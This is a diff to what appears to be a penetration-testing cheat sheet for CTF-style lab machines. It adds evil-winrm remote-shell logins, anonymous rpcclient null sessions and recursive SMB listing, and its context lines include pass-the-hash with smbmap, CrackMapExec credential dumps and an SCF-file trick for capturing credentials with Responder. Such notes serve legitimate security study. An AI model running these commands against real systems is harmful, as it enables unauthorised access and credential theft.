@@ -91,7 +91,7 @@ Test XSS
 
 Smbmap (shows a list of SMB Shares)
   Smbmap -u Username -p Password -H 10.10.10.97
-  Smbclient -U ‘username%password’ \\\\10.10.10.97\share
+  Smbclient -U ‘username%password’ \\\\10.10.10.97\share (recurse on) <- List everything
   Pass the Hash
   Smbmap -u alice1978 -p ‘NTLM_Hash:NTLM_Hash’ -H 10.10.10.107 
   -R (-R list contents of shares)
@@ -128,6 +128,12 @@ Crackmapexec (https://www.youtube.com/watch?v=Dd4ZAm2mwwA)
   cmedb (CME database)
     proto smb
     creds
+    
+Evil-WinRm
+  evil-winrm -i 10.10.10.175 -u username -p password
+  
+Anonymous RPC
+  rpcclient -U "" -N 10.10.10.161  
   
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
